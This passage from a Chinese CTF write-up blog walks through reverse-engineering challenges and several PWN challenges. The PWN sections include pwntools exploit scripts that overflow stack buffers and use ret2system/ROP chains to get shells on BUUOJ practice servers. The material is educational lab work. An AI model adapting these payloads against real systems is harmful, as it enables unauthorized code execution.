alt="image-20230801101445107"></p><p>有一说一,没懂明白全为0的寄存器如何运行sub指令,不知道是我看的不对还是咋的</p><p>代码就是多了几个AL,AH寄存器而已(但是我不会算…字节位置有点没弄明白)</p><p>x86平台(即32位平台)的EAX占32位(4字节),EAX的低16位是AX,AX的低8位是AL,AX的高8位是AH</p><p>但是算起来内存没弄明白…</p><p>暂时结束…</p><h2 id="reverse-cipher"><a href="#reverse-cipher" class="headerlink" title="reverse_cipher"></a>reverse_cipher</h2><p>这题简单,直接拖IDA看,逆向分析逻辑就行,就是最后那个}字符不知道咋的IDA逆向出v11&#x3D;v5…v5前面都没有初始化…不过不影响…手动putchar(str[23]);就行</p><p>直接在IDA逆向出的代码中加注释:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span> &#123;</span><br><span class="line">    <span class="type">char</span> ptr[<span class="number">23</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF //保存flag</span></span><br><span class="line">    <span class="type">char</span> v5; <span class="comment">// [rsp+17h] [rbp-39h] //?</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-24h] //标志位</span></span><br><span class="line">    FILE *v7; <span class="comment">// [rsp+30h] [rbp-20h] //rev_this的文件指针</span></span><br><span class="line">    FILE *stream; <span class="comment">// [rsp+38h] [rbp-18h] //flag的文件指针</span></span><br><span class="line">    <span class="type">int</span> j; <span class="comment">// [rsp+44h] [rbp-Ch]</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line">    <span class="type">char</span> v11; <span class="comment">// [rsp+4Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">    stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    v7 = fopen(<span class="string">&quot;rev_this&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !stream )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No flag found, please make sure this is run on the server&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;please run this on the server&quot;</span>);</span><br><span class="line"></span><br><span class="line">    v6 = fread(ptr, <span class="number">0x18</span>uLL, <span class="number">1uLL</span>, stream); <span class="comment">//v6用于检查是否成功读取,flag长度为0x18==24</span></span><br><span class="line">                                            <span class="comment">//flag保存到ptr数组中</span></span><br><span class="line">                                            <span class="comment">//最后一位ptr[23]没有使用? &#x27;&#125;&#x27;?(一开始以为是&#x27;\0&#x27;)</span></span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i ) &#123;<span class="comment">//读取前8个</span></span><br><span class="line">        v11 = ptr[i];</span><br><span class="line">        fputc(v11, v7);<span class="comment">//向v7(即rev_this文件)原封不动的写入前8位flag字符</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">8</span>; j &lt;= <span class="number">22</span>; ++j ) &#123; <span class="comment">//读取第9-23个flag字符</span></span><br><span class="line">        v11 = ptr[j];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//转换算法</span></span><br><span class="line">        <span class="keyword">if</span> ( (j &amp; <span class="number">1</span>) != <span class="number">0</span> ) <span class="comment">//如果j为奇数---j==8时是偶数</span></span><br><span class="line">            v11 -= <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v11 += <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">        fputc(v11, v7);<span class="comment">//处理后写入</span></span><br><span class="line">    &#125;</span><br><span class="line">    v11 = v5;<span class="comment">//这里IDA分析的有点问题,问题不大</span></span><br><span class="line">    fputc(v5, v7);</span><br><span class="line">    fclose(v7);</span><br><span class="line">    <span class="keyword">return</span> fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写解密脚本(c&#x2F;c++代码叫脚本?):</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line">    FILE* rev_this = <span class="built_in">fopen</span>(<span class="string">&quot;rev_this&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="built_in">fread</span>(str, <span class="number">0x18</span>uLL, <span class="number">1uLL</span>, rev_this);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">8</span>;i&lt;<span class="number">23</span>;++i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&amp;<span class="number">1</span>!=<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">putchar</span>(str[i]+<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">putchar</span>(str[i]<span class="number">-5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(str[<span class="number">23</span>]);<span class="comment">//单独处理一下那个v5(其实提交的时候加个&#125;就行,</span></span><br><span class="line">    <span class="comment">//但是这里因为不知道flag长啥样所以还是打印一下看看...万一是什么&#x27;\0&#x27;呢,doge)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801104929793.png" alt="image-20230801104929793"></p><p>结束…</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>先看看是啥文件—32位的,用IDA32打开</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802131013964.png" alt="image-20230802131013964" style="zoom:33%;" /><p>尝试IDA动态调试,莫名其妙不能动弹?难道是开了保护?(开保护是不能调试吗?)</p><p>额,nb…火力全开…</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802133400255.png" alt="image-20230802133400255" style="zoom:33%;" /><p>还是静态分析吧…</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802133651202.png" alt="image-20230802133651202" style="zoom: 50%;" /><p>这里其实最没弄明白的其实是那个LL,不确定val作为数组每个元素应该填充多长…但是这题是&lt;二进制&gt;赛项…</p><p>所以理论上这里应该是重点要关注的地方…</p><p>那么尽管IDA反编译出来的伪代码有点玄学…但是发现有一个重要的指针类型转换的步骤:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] == <span class="number">17LL</span> )</span><br></pre></td></tr></table></figure><p><code>QWORD</code>这个东西是4字节…众所周知,一个字是2字节,那么QWORD是4个字,也就是8字节…对上了,就是LL(long long)</p><p>那么就往进塞数据呗(这里我仍然想吐槽python的类型转换)</p><p>用python写exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29245</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">13</span> * <span class="number">4</span> + p64(<span class="number">17</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果(第二次的截图,省略了ls了…doge)<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802140330345.png" alt="image-20230802140330345"></p><p>结束…</p><h2 id="mrctf2020-easyoverflow"><a href="#mrctf2020-easyoverflow" class="headerlink" title="mrctf2020_easyoverflow"></a>mrctf2020_easyoverflow</h2><p>这题就是个字符串溢出</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802154650856.png" alt="image-20230802154650856" style="zoom: 50%;" /><p>首先main中v5被赋值为一个字符串,我叫他fake_flag0,然后有一个对v4的gets()</p><p>再看下面判断调用了check,并传递了v5这个字符数组</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802154817689.png" alt="image-20230802154817689" style="zoom:50%;" /><p>参数和另一个字符串比较,去看看:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802154845478.png" alt="image-20230802154845478" style="zoom:50%;" /><p>把这个字符串复制出来,我叫他fake_flag1</p><p>然后发现 main中v4有0x30个字节(48个)—(-0x40)-(-0x70)&#x3D;&#x3D;0x30</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802155008720.png" alt="image-20230802155008720" style="zoom:50%;" /><p>所以把这段内存覆盖了就行,exp如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802155044396.png" alt="image-20230802155044396" style="zoom:50%;" /><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802155058403.png" alt="image-20230802155058403" style="zoom:50%;" /><p>结束…</p><h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p>这道题最大的收获就是把x86的堆栈看了一遍,<del>还有脑内调试</del></p><p>有关X86 32位汇编利用堆栈传递函数参数的过程:</p><p>​<a href="https://blog.csdn.net/weixin_62320071/article/details/129475981">https://blog.csdn.net/weixin_62320071/article/details/129475981</a></p><p>​<a href="https://cloud.tencent.com/developer/article/2123636">https://cloud.tencent.com/developer/article/2123636</a></p><p>​<a href="https://zhuanlan.zhihu.com/p/290689333?ivk_sa=1024320u&utm_id=0">https://zhuanlan.zhihu.com/p/290689333?ivk_sa=1024320u&amp;utm_id=0</a></p><p>​<img src="https://pic2.zhimg.com/80/v2-53b1f83688ed5cc4bc7c5efa791a315d_1440w.webp" alt="img" style="zoom:65%;" /></p><p>题解:</p><p>这道题是典型的栈溢出,IDA反编译后的代码非常简单,有system函数的地址,而且我们可以通过字符串查找找到存在&#x2F;bin&#x2F;bash这个字符串(可获取地址)</p><p>那么我们就直接让vulnerable_function返回的时候跳转到system函数去getshell就可以</p><p>具体是由于read可输入的长度大于缓冲区的长度,所以存在溢出,那么只需要合理构造payload即可进行getshell</p><p>(但是我做这题很吃力,x86汇编属实不会,主要是对函数栈帧掌握不清楚)</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line">hacker = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">hacker = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25439</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x88</span></span><br><span class="line">system_func_addr = <span class="number">0x8048320</span></span><br><span class="line">bin_sh_str_addr = <span class="number">0x0804a024</span></span><br><span class="line"><span class="comment">#  首先先将该字符串数组填满，再输入一个地址，该地址将会作为新的栈底地址 ebp</span></span><br><span class="line"><span class="comment"># 再接着写入 函数调用返回的地址（即该值将来会pop 到 eip 中），即执行我们的system函数，为了把 字符串 /bin/sh 地址传入，我们还要往栈中随意插入一个将来的返回地址，再插入/bin/sh 地址</span></span><br><span class="line">payload = padding * <span class="string">b&#x27;a&#x27;</span> + p32(<span class="number">0xffffe000</span>) + p32(system_func_addr) + p32(<span class="number">0xffffe000</span>) + p32(bin_sh_str_addr)</span><br><span class="line"></span><br><span class="line">hacker.sendlineafter(<span class="string">b&#x27;Input:\n&#x27;</span>, payload)</span><br><span class="line">hacker.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802191847698.png" alt="image-20230802191847698"></p><p>勉强结束…</p><h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><h3 id="这道题学习到的知识点"><a href="#这道题学习到的知识点" class="headerlink" title="这道题学习到的知识点"></a>这道题学习到的知识点</h3><p>参阅:</p><p>​<a href="https://zhuanlan.zhihu.com/p/502718676">https://zhuanlan.zhihu.com/p/502718676</a></p><p>​<a href="https://stackoverflow.com/questions/23367624/intel-64-rsi-and-rdi-registers">https://stackoverflow.com/questions/23367624/intel-64-rsi-and-rdi-registers</a></p><p>​<a href="https://www.cnblogs.com/nemuzuki/p/17218722.html">https://www.cnblogs.com/nemuzuki/p/17218722.html</a></p><p>​</p><h4 id="x86-64函数传参使用到的寄存器"><a href="#x86-64函数传参使用到的寄存器" class="headerlink" title="x86_ 64函数传参使用到的寄存器"></a>x86_ 64函数传参使用到的寄存器</h4><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803114038935.png" alt="image-20230803114038935" style="zoom:50%;" /></p><p>​重点是rdi,rsi,rdx,rcx这几个</p><h3 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h3><h4 id="1-参数问题"><a href="#1-参数问题" class="headerlink" title="1.参数问题"></a>1.参数问题</h4><p>​这道题也是栈溢出,不过是x86_64的程序,所以我们重点注意的应该是去考虑x86_64和x86的堆栈(或者说函数调用时)有什么区别,而且重点要关注函数传参有什么不同</p><p>​经过学习,了解到在x86中,各个参数依次从右向左入栈(CDECL?),然后再压栈eip和ebp;</p><p>​而在x86_64中,如果子函数的参数数量&lt;&#x3D;6个,那么就会使用到6个特殊的寄存器,也就是上面的rdi，rsi，rdx，rcx，r8，r9这6个寄存器.然后如果还有参数,则像32位一样压栈.</p><p>​那么也就是说,64位程序调用函数时,<strong>会先把参数从寄存器中pop出来,也就是pop rdi; ret指令</strong></p><p>​对应到本题中调用system()函数只需要传递一个字符串,也就是system执行的命令,所以只需要多考虑一个rdi(第一个入参对应的寄存器)的问题</p><h4 id="2-题目分析"><a href="#2-题目分析" class="headerlink" title="2.题目分析"></a>2.题目分析</h4><p>​分析好关键后,接下来开始审题</p><p>​这次做题思路比较清晰,而且看了看雪上的某篇IDA使用教程,这回在IDAview视图中认真分析了一下汇编,后面记录一下(虽然和这道题的题解关系不大,但是有助于理解x86_64函数传参)</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803115419472.png" alt="image-20230803115419472" style="zoom:50%;" /></p><p>​题目和x86版本的基本一致,仍然是标准的栈溢出:buf数组长度为0x80,然而read()可以输入0x200,满足溢出</p><p>​同样,去找system()的地址和&#x2F;bin&#x2F;bash的地址</p><p>​shift+F12打开字符串,可以看到存在&#x2F;bin&#x2F;bash—0x600A90</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803115829908.png" alt="image-20230803115829908" style="zoom:50%;" /></p><p>​发现有_system函数(注意不是extern的那个system)—0x4004C0</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803115952419.png" alt="image-20230803115952419" style="zoom: 40%;" /></p><p>​接下来就是区别,需要找到pop rdi; ret指令的地址,以便调用</p><p>​这里需要使用到Linux下的ROPgadget工具查找(第一次用这个,看了一下使用方法)</p><p>​找到地址为0x4006b3<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803121412077.png" alt="image-20230803121412077"></p><h4 id="3-payload"><a href="#3-payload" class="headerlink" title="3.payload"></a>3.payload</h4><p>​覆盖模板: [函数局部变量(buf数组)]+[rbp]+[pop rdi; ret指令的地址]+[‘&#x2F;bin&#x2F;bash’的地址]+[system()函数的地址(实际上是那个_system())]</p><p>​python代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27828</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x4004C0</span></span><br><span class="line">bin_sh_addr = <span class="number">0x600A90</span></span><br><span class="line">pop_ret_addr = <span class="number">0x4006b3</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x80</span>) + <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x8</span>) + p64(pop_ret_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>​运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803122534132.png" alt="image-20230803122534132" style="zoom:45%;" /><p>​题解到此结束…</p><h3 id="题目IDAview分析记录"><a href="#题目IDAview分析记录" class="headerlink" title="题目IDAview分析记录"></a>题目IDAview分析记录</h3><h4 id="main-汇编分析"><a href="#main-汇编分析" class="headerlink" title="main()汇编分析"></a>main()汇编分析</h4><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803122808494.png" alt="image-20230803122808494"></p><p>main中有两个变量var_10和var_4</p><p>首先是调用main时,开头的push rbp;mov rbp,rsp指令创建函数栈帧,然后sub rsp,10h给局部变量(形参?)分配空间(10h应该是16字节给两个变量,一个int argc和一个char *argv[]的数组—数组形参实际上是一个指针,所以也是8字节)</p><p>然后接下来的两个mov就能看出来x86_64的传参了,第一个是edi,第二个是rsi,逐个从寄存器中复制到内存</p><p>然后eax置0</p><p>此时该调用函数了,因为vulnerable_function没有形参,所以没有对edi这些寄存器进行处理,直接调用</p><h4 id="vulnerable-function-汇编分析"><a href="#vulnerable-function-汇编分析" class="headerlink" title="vulnerable_function()汇编分析"></a>vulnerable_function()汇编分析</h4><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803123501210.png" alt="image-20230803123501210"></p><p>同样在开头push rbp;mov rbp,rsp创建函数栈帧</p><p>接下来是对rsp进行add,但是这里我不理解为什么是add而不是sub(),总之就是对buf数组进行处理分配</p><p>下一行就是为_system函数的调用做准备,处理实参:</p><p>​mov     edi, offset command ; “echo Input:”中,offset表示获取一个标号,command标号代表的内存中存有这个字符串,将其赋值给edi用于_system的第一个参数(只有这一个参数)</p><p>然后调用_system()</p><p>返回来后,继续为_read()的调用做准备:</p><p>​先放上来_read()的描述(注意参数的位置):</p><p>​<strong>其实这个函数就是unistd.h(UNIX std)中声明的read()函数,用于文件读写</strong></p><p>​第一个参数是文件描述符(0代表标准输入stdin,1代表标准输出stdout,2表示标准错误输出stderr)</p><p>​第二个参数是输入的目标缓冲区</p><p>​第三个参数是指定要读取的最大字节数</p><p>​<code>ssize_t read(int fd, void *buf, size_t nbytes)</code></p><p>​lea指令全称是 “Load Effective Address”，意为加载有效地址,就是将指定的内存地址计算出来并存放在目标寄存器中.这里这条指令将 <code>rbp+buf</code> 地址的计算结果保存在 <code>rax</code> 中,准备赋值给rsi</p><p>​将200h赋值给edx作为第3个参数(nbytes)</p><p>​将刚刚计算出来的eax赋值给rsi作为第二个参数(buf)</p><p>​将0h赋值给edi作为第一个参数(fd)</p><p>然后调用_read(),这道题的切入点就是这里</p><p>后面的部分没看…留作以后…</p><p>结束…</p><h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><p>这道题就是绕了一下,利用strcat()进行了栈溢出,同时不同的步骤需要从不同的函数进行处理利用,要进行顺序分析</p><p>分析如下:</p><p>代码首先需要输入正确的密码,然后下面是一个switch的循环(注意反编译显示循环使用一个跳转函数实现)</p><p>Addlog中允许输入0x80(128)长度的src</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200612721.png" alt="image-20230805200612721" style="zoom:50%;" /></p><p>print中有_system()函数可以利用</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200628207.png" alt="image-20230805200628207" style="zoom:45%;" /></p><p>getflag中有strcpy,同时局部变量(反编译问题)共有0x48,0x80&gt;0x48,满足溢出</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200700665.png" alt="image-20230805200700665" style="zoom:50%;" /></p><p>ROPgadget工具查找’sh’字符串的地址(此题没有&#x2F;bin&#x2F;sh)</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200722034.png" alt="image-20230805200722034" style="zoom: 40%;" /></p><p>先走1选项,输入足够长的字符串准备溢出,然后走4选项进行strcpy溢出,跳转至system()即可</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27895</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x080484D0</span></span><br><span class="line">sh_addr = <span class="number">0x080482ea</span></span><br><span class="line"><span class="comment"># pop_ret_addr = 0x4006b3 #64位用到</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x48</span> + <span class="number">4</span>) + p32(system_addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;info:&#x27;</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200041706.png" alt="image-20230805200041706" style="zoom:33%;" /><p>这题看了半天需要填充多少字节,唉,看错了</p><p>结束…</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> PWN </tag>
            
            <tag> x64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制作业第一周</title>
      <link href="/2023/07/27/%E4%BA%8C%E8%BF%9B%E5%88%B6/Writeup(%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BD%9C%E4%B8%9A%E7%AC%AC%E4%B8%80%E5%91%A8)/"/>
      <url>/2023/07/27/%E4%BA%8C%E8%BF%9B%E5%88%B6/Writeup(%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BD%9C%E4%B8%9A%E7%AC%AC%E4%B8%80%E5%91%A8)/</url>
      
        <content type="html"><![CDATA[<p>以前除了新生赛再没写过WP,还是多写这东西好(博客搭建还没搞好QWQ)</p><h1 id="RE"><a href="#RE" class="headerlink" title="RE:"></a>RE:</h1><p>所有题来自picoCTF2022,题目很简单,适用于萌新蒟蒻(比如我)入门快速适应re和pwn等题目的模式和解题一般顺序</p><h2 id="file-run1"><a href="#file-run1" class="headerlink" title="file-run1:"></a>file-run1:</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420724-111.png" alt="img"></p><p>是的,我们需要一个命令行(显然可以知道是个bash…),丢进去跑就行了…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420724-112.png" alt="img"></p><p>菜鸟’s writeup结束…</p><p>或者有椰叶丢进IDA里瞧瞧…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420724-113.png" alt="img"></p><p>去找flag吧…(好像是ctrl+鼠标左键?…)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-114.png" alt="img"></p><p>结束了…</p><h2 id="file-run2"><a href="#file-run2" class="headerlink" title="file-run2:"></a>file-run2:</h2><p>丢个Hello!的参数跑就完事了(我太菜了)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-115.png" alt="img"></p><p>中间还打错个字母…</p><h2 id="GDB-Test-Drive"><a href="#GDB-Test-Drive" class="headerlink" title="GDB Test Drive:"></a>GDB Test Drive:</h2><p>emm…这玩意就是看看你gdb装没装…虽然但是,我还得学学gdb(毕竟CLion&#x2F;VS的可视化用惯了…)</p><p>(此处gdbme默认有x权限,所以没用chmod)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-116.png" alt="img"></p><p>一条一条运行调试的子命令就行(回头再学吧…gdb不是太会用)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-117.png" alt="img"></p><p>结束…</p><h2 id="patchme-py"><a href="#patchme-py" class="headerlink" title="patchme.py:"></a>patchme.py:</h2><p>咱就是问,还有什么比源码更香的东西吗?…直接分析源码…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-118.png" alt="img"></p><p>python这东西就在windows下跑吧,毕竟库都装在windows下(虽然不知道为啥控制台识别不到库…)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-119.png" alt="img"></p><p>直接看源码,发现就是个字符串比较(暂时不想管那个加密的事…)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-120.png" alt="img"></p><p>有一说一,我才懒得构造那个密码,我直接全删了:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-121.png" alt="img"></p><p>保存了再跑就完事了…(源码在手还怕啥)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-122.png" alt="img"></p><p>至于解密方法能看懂在干啥,但是密码基础一点没有,反正先能跑出来再说,坐等椰叶们讲解(doge)</p><h2 id="Safe-Opener"><a href="#Safe-Opener" class="headerlink" title="Safe Opener:"></a>Safe Opener:</h2><p>.java也是源码…</p><p>SublimeText4 